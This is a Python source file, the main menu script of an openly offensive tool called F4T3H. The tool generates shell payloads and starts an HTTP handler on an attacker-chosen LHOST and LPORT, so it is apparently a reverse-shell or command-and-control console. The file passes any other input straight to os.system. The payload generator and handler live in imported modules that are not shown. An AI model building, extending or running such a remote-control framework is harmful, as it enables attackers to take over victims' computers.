
# By: Hossam Hamdy (0xGhazy)
# Python 3.8.4 used
# use it for educational purpose only, Don't be evil ;)

from os import system
from termcolor import colored
from Configurations import *
from HTTPHandler import HTTPHandlerFunc
from helper import help_handeler, banner, main_options
from Functions import*


if __name__ == '__main__':

    checking_requirements()
    banner()
    main_options()
    
    while True:
        CWD = colored(os.getcwd(), "red")
        try:
            command = input(f"F4T3H({CWD})> ")
            if int(command) < 0 or int(command) > 3:
                print(colored("~_~", "red"))
        except ValueError:
            # to skip error msg.
            pass
        if command == "":
            print(colored("~_~", "red"))

        elif command == "new" or command == "1":
            generate_shell()

        elif command == "start" or command == "2":
            print_attacker_address()
            lhost = input(colored("LHOST> ", "blue"))
            lport = int(input(colored("LPORT> ", "blue")))
            HTTPHandlerFunc(check_host(lhost), check_port(lport))

        elif command == "help" or command == "3":
            help_handeler()

        elif command == "exit" or command == "0":
            exit(0)

        elif "cd" in command:
            _, directory = command.split(" ")
            CWD = os.chdir(directory)

        else:
            system(command)


# TODO: Supporting multi clients.
# TODO: Supporting metasploit modules.
